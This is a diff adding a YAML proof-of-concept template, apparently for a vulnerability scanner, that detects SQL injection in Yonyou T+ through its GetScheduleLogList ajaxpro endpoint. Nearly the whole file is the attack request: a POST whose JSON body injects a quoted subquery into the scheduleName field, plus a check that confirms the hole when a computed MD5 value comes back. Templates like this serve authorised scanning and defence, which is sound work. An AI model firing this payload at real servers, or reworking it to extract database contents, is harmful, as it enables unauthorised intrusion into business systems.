@@ -1,0 +1,22 @@
+name: poc-yaml-tplus-getscheduleloglist-sql
+transport: http
+set:
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: >-
+        /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList
+      follow_redirects: false
+      headers:
+        Content-Type: application/json
+      body: >-
+        {"scheduleName": "DatabaseConsolidationTask' and 1=(select
+        substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{s1}}')),3,32))--"}
+    expression: response.status == 200 && response.body_string.contains(md5(s1))
+expression: r0()
+detail:
+  author: h1ei1
+  links:
+    - https://www.anquanke.com/post/id/195226
